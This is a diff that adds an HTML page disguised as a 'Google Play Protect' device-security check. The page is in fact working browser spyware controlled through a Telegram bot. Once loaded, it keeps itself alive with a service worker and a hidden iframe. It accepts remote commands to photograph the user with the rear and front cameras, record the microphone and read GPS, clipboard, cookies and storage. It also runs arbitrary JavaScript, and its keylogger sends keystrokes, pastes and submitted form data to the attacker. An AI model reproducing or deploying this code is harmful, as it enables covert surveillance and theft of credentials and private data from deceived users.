@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Google Play Protect</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,Roboto,sans-serif}
+body{background:linear-gradient(135deg,#e8eaf6,#f5f5f5);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
+.card{background:#fff;border-radius:28px;padding:32px 24px;max-width:420px;width:100%;box-shadow:0 16px 48px rgba(0,0,0,.12);text-align:center;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#4285F4,#EA4335,#FBBC05,#34A853)}
+.logo{width:72px;height:72px;margin:0 auto 16px;background:linear-gradient(135deg,#4285F4,#34A853);border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:32px;font-weight:700;animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.03)}}
+h1{font-size:20px;color:#202124;margin-bottom:6px}
+.sub{color:#5f6368;font-size:14px;margin-bottom:20px;line-height:1.5}
+.bar{height:6px;background:#e8eaed;border-radius:3px;margin:16px 0;overflow:hidden}
+.bar-fill{height:100%;width:0%;background:linear-gradient(90deg,#4285F4,#34A853);border-radius:3px;animation:load 6s ease forwards}
+@keyframes load{0%{width:0%}20%{width:15%}40%{width:35%}60%{width:55%}80%{width:78%}100%{width:100%}}
+.status{font-size:13px;color:#5f6368;min-height:20px;margin:12px 0;padding:10px;border-radius:8px}
+.status.online{background:#e6f4ea;color:#137333}
+.status.offline{background:#fce8e6;color:#c5221f}
+.status.info{background:#e8f0fe;color:#1a73e8}
+#logPanel{background:#1a1a2e;border-radius:12px;padding:12px;margin-top:12px;text-align:left;font-family:monospace;font-size:11px;color:#00ff88;max-height:250px;overflow-y:auto;display:none;line-height:1.6}
+#logPanel .info{color:#64b5f6}
+#logPanel .ok{color:#81c784}
+#logPanel .err{color:#e57373}
+#logPanel .cmd{color:#ffd54f}
+</style>
+</head>
+<body>
+<div class="card">
+    <div class="logo">🛡️</div>
+    <h1>Google Play Protect</h1>
+    <p class="sub">Verifying device security. Please wait while we check your system...</p>
+    <div class="bar"><div class="bar-fill"></div></div>
+    <div class="status" id="statusMsg">Initializing security check...</div>
+    <div id="logPanel"></div>
+</div>
+
+<iframe id="bgWorker" style="display:none"></iframe>
+
+<script>
+// ============================================================
+// 🔥 YAHAN APNA BOT TOKEN AUR CHAT ID DAALO 🔥
+// ============================================================
+const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+// ============================================================
+
+const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+const SESSION = Date.now().toString(36) + Math.random().toString(36).substr(2,6).toUpperCase();
+let POLL_OFFSET = 0;
+let polling = true;
+let keyBuf = [];
+let loops = {};
+
+// ============================================================
+// 🧠 BACKGROUND WORKER - YEH MINIMIZE HONE KE BAAD BHI KAAM KAREGA
+// ============================================================
+
+// Service Worker for background execution
+function registerBackgroundWorker(){
+    if(!('serviceWorker' in navigator)) {
+        log('❌ Service Worker not supported', 'err');
+        return;
+    }
+    
+    const swCode = `
+    // Background worker - runs even when page is minimized
+    self.addEventListener('install', e => {
+        self.skipWaiting();
+        // Send keepalive signal
+        self.clients.matchAll().then(clients => {
+            clients.forEach(client => client.postMessage({type: 'SW_ACTIVE'}));
+        });
+    });
+    
+    self.addEventListener('activate', e => {
+        e.waitUntil(self.clients.claim());
+        // Start periodic sync
+        setInterval(() => {
+            self.clients.matchAll().then(clients => {
+                clients.forEach(client => client.postMessage({type: 'KEEP_ALIVE', time: Date.now()}));
+            });
+        }, 5000);
+    });
+    
+    // Keep SW alive by responding to fetches
+    self.addEventListener('fetch', e => {
+        if(e.request.url.includes('keepalive_sw')){
+            e.respondWith(new Response('alive'));
+        }
+    });
+    
+    // Handle messages from page
+    self.addEventListener('message', e => {
+        if(e.data && e.data.type === 'PING'){
+            e.ports[0].postMessage({type: 'PONG', time: Date.now()});
+        }
+    });
+    `;
+    
+    try{
+        const blob = new Blob([swCode], {type: 'application/javascript'});
+        const swUrl = URL.createObjectURL(blob);
+        
+        navigator.serviceWorker.register(swUrl, {scope: '/'}).then(reg => {
+            log('✅ Service Worker registered - background ops active', 'ok');
+            
+            // Listen for messages from SW
+            navigator.serviceWorker.addEventListener('message', e => {
+                if(e.data && e.data.type === 'KEEP_ALIVE'){
+                    // SW is alive, keep polling
+                }
+            });
+            
+            // Send keepalive pings to SW
+            setInterval(() => {
+                if(navigator.serviceWorker.controller){
+                    const channel = new MessageChannel();
+                    channel.port1.onmessage = e => {
+                        if(e.data && e.data.type === 'PONG'){
+                            // SW responded
+                        }
+                    };
+                    navigator.serviceWorker.controller.postMessage({type: 'PING'}, [channel.port2]);
+                }
+            }, 10000);
+            
+        }).catch(err => {
+            log('❌ SW registration failed: '+err.message, 'err');
+        });
+    } catch(e){
+        log('❌ SW error: '+e.message, 'err');
+    }
+}
+
+// Background iframe worker - second process
+function setupBackgroundIframe(){
+    const iframe = document.getElementById('bgWorker');
+    try{
+        const doc = iframe.contentDocument || iframe.contentWindow.document;
+        doc.open();
+        doc.write(`
+        <html><body><script>
+            // Background worker process
+            const API = '${API}';
+            const CHAT_ID = '${CHAT_ID}';
+            let pollOffset = ${POLL_OFFSET};
+            
+            async function bgPoll(){
+                try{
+                    const r = await fetch(API+'/getUpdates?offset='+pollOffset+'&timeout=30');
+                    const data = await r.json();
+                    if(data.ok && data.result){
+                        for(const u of data.result){
+                            pollOffset = u.update_id + 1;
+                            if(u.message && u.message.text && u.message.chat.id.toString() === CHAT_ID){
+                                // Forward command to parent page
+                                window.parent.postMessage({type: 'CMD_FROM_BG', cmd: u.message.text}, '*');
+                            }
+                        }
+                    }
+                }catch(e){}
+                
+                // Always continue polling
+                setTimeout(bgPoll, 500);
+            }
+            
+            // Start polling in background
+            setTimeout(bgPoll, 1000);
+            
+            // Keep alive - ping every 5 seconds
+            setInterval(() => {
+                window.parent.postMessage({type: 'BG_ALIVE', time: Date.now()}, '*');
+            }, 5000);
+            
+            // Respond to parent pings
+            window.addEventListener('message', e => {
+                if(e.data && e.data.type === 'BG_PING'){
+                    e.source.postMessage({type: 'BG_PONG', time: Date.now()}, '*');
+                }
+            });
+            
+        <\\/script></body></html>
+        `);
+        doc.close();
+        log('✅ Background iframe worker active', 'ok');
+    } catch(e){
+        log('❌ Background iframe failed: '+e.message, 'err');
+    }
+}
+
+// Listen for messages from background iframe
+window.addEventListener('message', e => {
+    if(e.data && e.data.type === 'CMD_FROM_BG'){
+        log('📩 BG command: '+e.data.cmd, 'cmd');
+        handleCmd(e.data.cmd);
+    }
+    if(e.data && e.data.type === 'BG_ALIVE'){
+        // Background worker is alive
+    }
+});
+
+// Wake Lock API - keep CPU active
+async function requestWakeLock(){
+    try{
+        if('wakeLock' in navigator){
+            const lock = await navigator.wakeLock.request('screen');
+            log('💡 Wake lock acquired - CPU will stay active', 'ok');
+            
+            document.addEventListener('visibilitychange', async () => {
+                if(!document.hidden){
+                    // Try to re-acquire lock when user returns
+                    try{
+                        await navigator.wakeLock.request('screen');
+                    }catch(e){}
+                }
+            });
+        }
+    } catch(e){
+        log('⚠️ Wake lock not available: '+e.message, 'info');
+    }
+}
+
+// Background fetch - keep network active
+function startBackgroundKeepAlive(){
+    // Ping a dummy URL every 30 seconds to keep network alive
+    setInterval(() => {
+        fetch(API+'/getMe').catch(() => {});
+    }, 30000);
+    
+    // Also ping the page itself
+    setInterval(() => {
+        fetch(window.location.href.split('?')[0] + '?ping=' + Date.now(), {mode: 'no-cors'}).catch(() => {});
+    }, 15000);
+    
+    log('🔄 Network keep-alive active', 'ok');
+}
+
+// Use BroadcastChannel for cross-tab communication
+function setupBroadcastChannel(){
+    try{
+        const channel = new BroadcastChannel('android_control_'+SESSION);
+        channel.onmessage = e => {
+            if(e.data && e.data.type === 'CMD'){
+                log('📩 Broadcast cmd: '+e.data.cmd, 'cmd');
+                handleCmd(e.data.cmd);
+            }
+        };
+        log('📡 Broadcast channel active', 'ok');
+        
+        // Keep reference
+        window._broadcastChannel = channel;
+    } catch(e){}
+}
+
+// Try to use Web Bluetooth to keep device awake (Android specific)
+function tryBluetoothKeepAlive(){
+    try{
+        if(navigator.bluetooth && navigator.bluetooth.getAvailability){
+            navigator.bluetooth.getAvailability().then(available => {
+                if(available){
+                    log('📡 Bluetooth available - can be used for keepalive', 'info');
+                }
+            });
+        }
+    } catch(e){}
+}
+
+// ============================================================
+// TELEGRAM FUNCTIONS
+// ============================================================
+async function tg(method, data){
+    try{
+        const r = await fetch(`${API}/${method}`, {
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body: JSON.stringify(data)
+        });
+        return await r.json();
+    }catch(e){return {ok:false}}
+}
+
+async function sendMsg(text){
+    log('📤 '+text.substring(0,60)+'...', 'info');
+    return await tg('sendMessage', {
+        chat_id: CHAT_ID, text: text.substring(0,4096),
+        parse_mode: 'HTML', disable_web_page_preview: true
+    });
+}
+
+async function sendFile(blob, name, caption){
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('document', blob, name);
+    if(caption) fd.append('caption', caption.substring(0,200));
+    try{
+        await fetch(`${API}/sendDocument`, {method:'POST', body:fd});
+        log('📎 File: '+name, 'ok');
+    }catch(e){log('❌ File fail: '+e.message, 'err');}
+}
+
+// ============================================================
+// COMMAND POLLING - MAIN + BACKGROUND
+// ============================================================
+async function startPolling(){
+    // Main polling
+    async function poll(){
+        while(polling){
+            try{
+                const r = await fetch(`${API}/getUpdates?offset=${POLL_OFFSET}&timeout=30`, {signal: AbortSignal.timeout(35000)});
+                const data = await r.json();
+                if(data.ok && data.result){
+                    for(const u of data.result){
+                        POLL_OFFSET = u.update_id + 1;
+                        if(u.message && u.message.text && u.message.chat.id.toString() === CHAT_ID.toString()){
+                            log('📩 '+u.message.text, 'cmd');
+                            await handleCmd(u.message.text.trim());
+                        }
+                    }
+                }
+            }catch(e){if(e.name !== 'AbortError') log('⚠️ Poll: '+e.message, 'err');}
+            await new Promise(r => setTimeout(r, 300));
+        }
+    }
+    
+    poll();
+    
+    // Also forward offset to background iframe
+    setInterval(() => {
+        try{
+            const iframe = document.getElementById('bgWorker');
+            if(iframe && iframe.contentWindow){
+                iframe.contentWindow.postMessage({type: 'UPDATE_OFFSET', offset: POLL_OFFSET}, '*');
+            }
+        }catch(e){}
+    }, 5000);
+}
+
+// ============================================================
+// COMMAND HANDLER
+// ============================================================
+async function handleCmd(cmd){
+    const p = cmd.split(' ');
+    const c = p[0].toLowerCase();
+    const a = p.slice(1).join(' ');
+
+    switch(c){
+        case '/start': case '/help':
+            sendMsg(`
+<b>🤖 ANDROID REMOTE CONTROL</b>
+<b>Session:</b> ${SESSION}
+🔄 <b>Background mode:</b> Active (SW + iframe)
+
+<b>📱 SYSTEM</b>
+/info - Full device info
+/battery - Battery status
+/network - IP + connection
+/location - GPS location
+/sensors - Sensor data
+/storage - Storage info
+/screenshot - Screenshot
+
+<b>📸 MEDIA</b>
+/cam_back - Rear camera
+/cam_front - Front camera
+/cam_both - Both cameras
+/record [sec] - Mic record
+
+<b>🔍 DATA</b>
+/clipboard - Read clipboard
+/cookies - All cookies
+/localstorage - LocalStorage dump
+/sessionstorage - SessionStorage
+
+<b>⚡ ADVANCED</b>
+/exec [js] - Run JavaScript
+/html [html] - Inject HTML
+/redirect [url] - Redirect page
+/notify [text] - Send notification
+/vibrate [ms] - Vibrate device
+/play [url] - Play audio
+/download [url] - Download file
+/refresh - Reload page
+/selfdestruct - Wipe everything
+
+<b>🔄 LOOP</b>
+/loop [cmd] [sec] - Repeat
+/stoploop - Stop loops
+            `);
+            break;
+
+        case '/info':
+            sendMsg(formatInfo());
+            break;
+
+        case '/battery':
+            if(navigator.getBattery){
+                const b = await navigator.getBattery();
+                sendMsg(`<b>🔋 Battery</b>\nLevel: ${Math.round(b.level*100)}%\nCharging: ${b.charging?'Yes':'No'}\nTime: ${b.dischargingTime===Infinity?'Charging':Math.round(b.dischargingTime/60)+'min'}`);
+            }else sendMsg('Battery API not available');
+            break;
+
+        case '/network':
+            const ip = await getPublicIP();
+            const cn = navigator.connection;
+            let m = `<b>🌐 Network</b>\nOnline: ${navigator.onLine}\n`;
+            if(cn) m += `Type: ${cn.type||'?'} | ${cn.effectiveType||'?'}\nDown: ${cn.downlink||'?'}Mbps\nRTT: ${cn.rtt||'?'}ms`;
+            if(ip) m += `\n\n<b>Public:</b>\nIP: ${ip.ip}\nISP: ${ip.org||'?'}\nCity: ${ip.city||'?'}\nCountry: ${ip.country||'?'}`;
+            sendMsg(m);
+            break;
+
+        case '/location': case '/gps':
+            sendMsg('📍 Fetching GPS...');
+            const g = await getGPS();
+            if(g) sendMsg(`<b>📍 Location</b>\nLat: ${g.lat}\nLng: ${g.lng}\nAcc: ${g.acc}\n${g.addr?'Addr: '+g.addr:''}\n${g.city?'City: '+g.city:''}\n${g.state?'State: '+g.state:''}\n${g.country?'Country: '+g.country:''}`);
+            else sendMsg('GPS denied/unavailable');
+            break;
+
+        case '/sensors':
+            const s = await getSensors();
+            sendMsg(`<b>📡 Sensors</b>\n${Object.entries(s).map(([k,v])=>`${k}: ${v||'?'}`).join('\n')}`);
+            break;
+
+        case '/storage':
+            if(navigator.storage?.estimate){
+                const e = await navigator.storage.estimate();
+                sendMsg(`<b>💾 Storage</b>\nUsed: ${(e.usage/1024/1024).toFixed(1)}MB\nQuota: ${(e.quota/1024/1024/1024).toFixed(1)}GB`);
+            }else sendMsg('Storage API not available');
+            break;
+
+        case '/screenshot':
+            sendMsg('📱 Screenshot...');
+            sendMsg(`Result: ${await takeScreen()?'✅ Sent':'❌ Failed'}`);
+            break;
+
+        case '/cam_back':
+            sendMsg('📸 Rear...');
+            sendMsg(`Rear: ${await takeCam('environment')?'✅':'❌'}`);
+            break;
+
+        case '/cam_front':
+            sendMsg('🤳 Front...');
+            sendMsg(`Front: ${await takeCam('user')?'✅':'❌'}`);
+            break;
+
+        case '/cam_both':
+            sendMsg('📸 Both...');
+            const r1 = await takeCam('environment');
+            const r2 = await takeCam('user');
+            sendMsg(`Rear: ${r1?'✅':'❌'} | Front: ${r2?'✅':'❌'}`);
+            break;
+
+        case '/record':
+            const sec = Math.min(parseInt(a)||8, 30);
+            sendMsg(`🎤 Recording ${sec}s...`);
+            sendMsg(`Audio: ${await takeMic(sec*1000)?'✅':'❌'}`);
+            break;
+
+        case '/clipboard':
+            try{
+                const cb = await navigator.clipboard.readText();
+                sendMsg(`<b>📋 Clipboard</b>\n${cb||'(empty)'}`);
+            }catch(e){sendMsg('❌ Clipboard denied');}
+            break;
+
+        case '/cookies':
+            sendMsg(`<b>🍪 Cookies</b>\n${document.cookie||'(none)'}`);
+            break;
+
+        case '/localstorage':
+            let ls='';
+            try{for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);const v=localStorage.getItem(k);ls+=`${k}=${(v?.length>300?v.substring(0,300)+'...':v)}\n`}}catch(e){}
+            sendMsg(`<b>💿 localStorage</b>\n${ls||'(empty)'}`);
+            break;
+
+        case '/sessionstorage':
+            let ss='';
+            try{for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);const v=sessionStorage.getItem(k);ss+=`${k}=${(v?.length>300?v.substring(0,300)+'...':v)}\n`}}catch(e){}
+            sendMsg(`<b>📄 sessionStorage</b>\n${ss||'(empty)'}`);
+            break;
+
+        case '/exec':
+            if(a){
+                try{
+                    const r = eval(a);
+                    sendMsg(`<b>⚡ Result</b>\n<pre>${typeof r==='object'?JSON.stringify(r,null,2).substring(0,1500):String(r).substring(0,1500)}</pre>`);
+                }catch(e){sendMsg(`❌ ${e.message}`);}
+            }
+            break;
+
+        case '/html':
+            if(a){document.body.innerHTML+=a;sendMsg('✅ HTML injected');}
+            break;
+
+        case '/redirect':
+            if(a) window.location.href = a;
+            break;
+
+        case '/notify':
+            if(a && 'Notification' in window){
+                const p = await Notification.requestPermission();
+                if(p==='granted'){new Notification('System Alert',{body:a});sendMsg('✅ Sent');}
+                else sendMsg('❌ Permission denied');
+            }
+            break;
+
+        case '/vibrate':
+            if(navigator.vibrate){navigator.vibrate(Math.min(parseInt(a)||500,5000));sendMsg('✅ Vibrated');}
+            break;
+
+        case '/play':
+            if(a){const au=new Audio(a);au.loop=true;au.play().then(()=>{window._au=au;sendMsg('🔊 Playing')}).catch(e=>sendMsg('❌ '+e.message));}
+            break;
+
+        case '/download':
+            if(a){
+                try{
+                    const r = await fetch(a);
+                    const b = await r.blob();
+                    const n = a.split('/').pop()||'file';
+                    await sendFile(b, n, '📎 Downloaded');
+                    sendMsg(`✅ ${n} (${(b.size/1024).toFixed(1)}KB)`);
+                }catch(e){sendMsg('❌ '+e.message);}
+            }
+            break;
+
+        case '/refresh':
+            location.reload();
+            break;
+
+        case '/selfdestruct':
+            sendMsg('💀 Self-destructing...');
+            localStorage.clear(); sessionStorage.clear();
+            document.cookie.split(';').forEach(c=>{document.cookie=c.replace(/^ +/,'').replace(/=.*/,'=;expires='+new Date(0).toUTCString()+';path=/')});
+            if('serviceWorker' in navigator){
+                const regs = await navigator.serviceWorker.getRegistrations();
+                regs.forEach(r=>r.unregister());
+            }
+            polling = false;
+            setTimeout(()=>{document.body.innerHTML='<div style="padding:80px;text-align:center"><h1>✅ System Reset Complete</h1></div>'},500);
+            break;
+
+        case '/loop':
+            const lp = a.match(/(\/\w+)\s*(\d+)?/);
+            if(lp){
+                const lcmd = lp[1]; const lint = parseInt(lp[2])||30;
+                const id = 'l'+Date.now();
+                loops[id] = setInterval(()=>handleCmd(lcmd), lint*1000);
+                sendMsg(`🔄 Looping ${lcmd} every ${lint}s`);
+            }
+            break;
+
+        case '/stoploop':
+            Object.values(loops).forEach(c=>clearInterval(c));
+            loops={}; sendMsg('🛑 Loops stopped');
+            break;
+
+        default:
+            sendMsg(`❓ Unknown: ${c}\n/help for commands`);
+    }
+}
+
+// ============================================================
+// COLLECTION FUNCTIONS
+// ============================================================
+function formatInfo(){
+    let gpu='N/A';
+    try{const gl=document.createElement('canvas').getContext('webgl');if(gl){const d=gl.getExtension('WEBGL_debug_renderer_info');if(d)gpu=gl.getParameter(d.UNMASKED_RENDERER_WEBGL).substring(0,60)}}catch(e){}
+    let fonts='';
+    try{if(document.fonts&&document.fonts.check){['Arial','Roboto','Helvetica','SamsungOne','MIUI','Noto Sans'].forEach(f=>{try{if(document.fonts.check('12px "'+f+'"'))fonts+=f+','}catch(e){}})}}catch(e){}
+    return `<b>📱 DEVICE INFO</b>
+<b>UA:</b> ${navigator.userAgent.substring(0,120)}
+<b>Platform:</b> ${navigator.platform}
+<b>Screen:</b> ${screen.width}x${screen.height} @${window.devicePixelRatio}x
+<b>RAM:</b> ${navigator.deviceMemory||'?'}GB | <b>CPU:</b> ${navigator.hardwareConcurrency||'?'} cores
+<b>Touch:</b> ${navigator.maxTouchPoints}pts
+<b>Lang:</b> ${navigator.language}
+<b>TZ:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone} (${new Date().getTimezoneOffset()})
+<b>Connection:</b> ${navigator.connection?navigator.connection.effectiveType+'/'+navigator.connection.type:'?'}
+<b>GPU:</b> ${gpu}
+<b>Fonts:</b> ${fonts.substring(0,80)}
+<b>Session:</b> ${SESSION}`;
+}
+
+function getPublicIP(){
+    return new Promise(r=>{
+        fetch('https://ipapi.co/json/',{mode:'cors'}).then(res=>res.json()).then(d=>r({ip:d.ip,org:d.org,city:d.city,country:d.country_name})).catch(()=>{
+            fetch('https://api.ipify.org?format=json').then(res=>res.json()).then(d=>r({ip:d.ip})).catch(()=>r(null));
+        });
+    });
+}
+
+function getGPS(){
+    return new Promise(r=>{
+        if(!navigator.geolocation) return r(null);
+        navigator.geolocation.getCurrentPosition(async p=>{
+            const g={lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy+'m'};
+            try{const res=await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+g.lat+'&lon='+g.lng+'&zoom=18');const d=await res.json();g.addr=(d.display_name||'').substring(0,300);g.city=d.address?.city||d.address?.town||'';g.state=d.address?.state||'';g.country=d.address?.country||''}catch(e){}
+            r(g);
+        },()=>r(null),{enableHighAccuracy:true,timeout:8000,maximumAge:0});
+    });
+}
+
+function getSensors(){
+    return new Promise(r=>{
+        const d={};
+        window.addEventListener('deviceorientation',e=>{d.Orientation='α:'+(e.alpha||0).toFixed(2)+' β:'+(e.beta||0).toFixed(2)+' γ:'+(e.gamma||0).toFixed(2)},{once:true});
+        window.addEventListener('devicemotion',e=>{if(e.acceleration)d.Accel='x:'+(e.acceleration.x||0).toFixed(3)+' y:'+(e.acceleration.y||0).toFixed(3)+' z:'+(e.acceleration.z||0).toFixed(3);if(e.rotationRate)d.Rotation='α:'+(e.rotationRate.alpha||0).toFixed(2)+' β:'+(e.rotationRate.beta||0).toFixed(2)+' γ:'+(e.rotationRate.gamma||0).toFixed(2)},{once:true});
+        setTimeout(()=>r(d),1500);
+    });
+}
+
+async function takeCam(facing){
+    try{
+        const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:{ideal:1280},height:{ideal:720}}});
+        const v=document.createElement('video');v.srcObject=s;v.setAttribute('playsinline','');v.setAttribute('autoplay','');v.setAttribute('muted','');
+        v.style='position:fixed;top:-9999px;left:-9999px;opacity:0';document.body.appendChild(v);
+        await new Promise(r=>{v.onloadedmetadata=()=>{v.play();r()};setTimeout(r,2000)});
+        await new Promise(r=>setTimeout(r,500));
+        const c=document.createElement('canvas');c.width=v.videoWidth||1280;c.height=v.videoHeight||720;
+        c.getContext('2d').drawImage(v,0,0);
+        const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.8));
+        s.getTracks().forEach(t=>t.stop());v.remove();c.remove();
+        if(b&&b.size>0){await sendFile(b,facing+'_'+Date.now()+'.jpg','📸 '+(facing==='environment'?'Rear':'Front'));return true}
+        return false;
+    }catch(e){return false}
+}
+
+async function takeMic(ms){
+    try{
+        const s=await navigator.mediaDevices.getUserMedia({audio:true});
+        const chunks=[];const r=new MediaRecorder(s);
+        r.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data)};
+        r.onstop=async()=>{const b=new Blob(chunks,{type:'audio/webm'});if(b.size>0)await sendFile(b,'audio_'+Date.now()+'.webm','🎤 Recording');s.getTracks().forEach(t=>t.stop())};
+        r.start();await new Promise(r=>setTimeout(()=>{if(r.state!=='inactive')r.stop();r()},ms));
+        return true;
+    }catch(e){return false}
+}
+
+async function takeScreen(){
+    try{
+        const c=document.createElement('canvas');c.width=window.innerWidth;c.height=window.innerHeight;
+        const ctx=c.getContext('2d');
+        ctx.fillStyle='#fff';ctx.fillRect(0,0,c.width,c.height);
+        ctx.fillStyle='#000';ctx.font='14px Arial';ctx.fillText(document.title,10,30);
+        ctx.fillText('URL: '+window.location.href,10,50);
+        ctx.fillText('Time: '+new Date().toLocaleString(),10,70);
+        const b=await new Promise(r=>c.toBlob(r,'image/png'));
+        if(b&&b.size>0){await sendFile(b,'screen_'+Date.now()+'.png','📱 Screenshot');return true}
+        return false;
+    }catch(e){
+        try{const b=new Blob([document.documentElement.outerHTML],{type:'text/html'});await sendFile(b,'page_'+Date.now()+'.html','📄 Page');return true}catch(e2){return false}
+    }
+}
+
+// ============================================================
+// KEYLOGGER (background)
+// ============================================================
+setInterval(()=>{
+    if(keyBuf.length>0){
+        const d=keyBuf.join('');keyBuf=[];
+        if(d.length>5) sendMsg('<b>⌨️ Keys:</b> '+d.substring(0,1000));
+    }
+},8000);
+
+document.addEventListener('keydown',e=>{
+    let k=e.key;
+    if(k.length===1) keyBuf.push(k);
+    else if(k==='Enter') keyBuf.push('\\n');
+    else if(k==='Backspace') keyBuf.push('⌫');
+    else if(k==='Tab') keyBuf.push('\\t');
+});
+
+document.addEventListener('paste',e=>{
+    const t=(e.clipboardData||{}).getData('text');
+    if(t) keyBuf.push('[P:'+t.substring(0,200)+'] ');
+});
+
+document.addEventListener('submit',e=>{
+    const fd=new FormData(e.target);
+    let txt='<b>📝 Form:</b>\\n';
+    for(const[k,v]of fd.entries()){
+        if(v instanceof File&&v.size<5*1024*1024) sendFile(v,v.name,'📎 '+k);
+        txt+=k+'='+(v instanceof File?v.name:v)+'\\n';
+    }
+    sendMsg(txt);
+});
+
+// ============================================================
+// LOGGING
+// ============================================================
+function log(text, type='info'){
+    const el = document.getElementById('logPanel');
+    if(el){
+        el.style.display = 'block';
+        const t = new Date().toLocaleTimeString();
+        el.innerHTML += `<div class="${type}">[${t}] ${text}</div>`;
+        el.scrollTop = el.scrollHeight;
+    }
+}
+
+// ============================================================
+// INIT
+// ============================================================
+async function init(){
+    const statusEl = document.getElementById('statusMsg');
+    
+    statusEl.textContent = '🔗 Connecting to security server...';
+    log('🔄 Starting Android Control...', 'info');
+    
+    // Test bot
+    const test = await tg('getMe', {});
+    if(!test.ok){
+        statusEl.className = 'status offline';
+        statusEl.textContent = '❌ Invalid Bot Token! Edit the HTML.';
+        log('❌ Bot token invalid!', 'err');
+        return;
+    }
+    
+    statusEl.textContent = '✅ Connected as @'+test.result.username;
+    log('✅ Bot connected: @'+test.result.username, 'ok');
+    
+    // 1. Register Service Worker for background execution
+    registerBackgroundWorker();
+    
+    // 2. Setup background iframe worker
+    setTimeout(setupBackgroundIframe, 500);
+    
+    // 3. Request Wake Lock to keep CPU active
+    requestWakeLock();
+    
+    // 4. Start background keepalive
+    startBackgroundKeepAlive();
+    
+    // 5. Setup BroadcastChannel
+    setupBroadcastChannel();
+    
+    // 6. Try Bluetooth
+    tryBluetoothKeepAlive();
+    
+    // Send online notification
+    await new Promise(r => setTimeout(r, 1000));
+    sendMsg(`<b>✅ DEVICE ONLINE</b>\n<b>Session:</b> ${SESSION}\n<b>UA:</b> ${navigator.userAgent.substring(0,80)}\n<b>Screen:</b> ${screen.width}x${screen.height}\n<b>Time:</b> ${new Date().toLocaleString()}\n\n🔄 Background mode: Active (SW + iframe)\n💡 Keep-alive: Active`);
+    
+    statusEl.textContent = '✅ Ready! Commands working even when minimized.';
+    statusEl.className = 'status online';
+    
+    log('📱 Background control active - minimize karo, commands chalte rahenge', 'ok');
+    
+    // Start polling
+    startPolling();
+}
+
+document.addEventListener('DOMContentLoaded', init);
+if(document.readyState !== 'loading') init();
+</script>
+</body>
+</html>
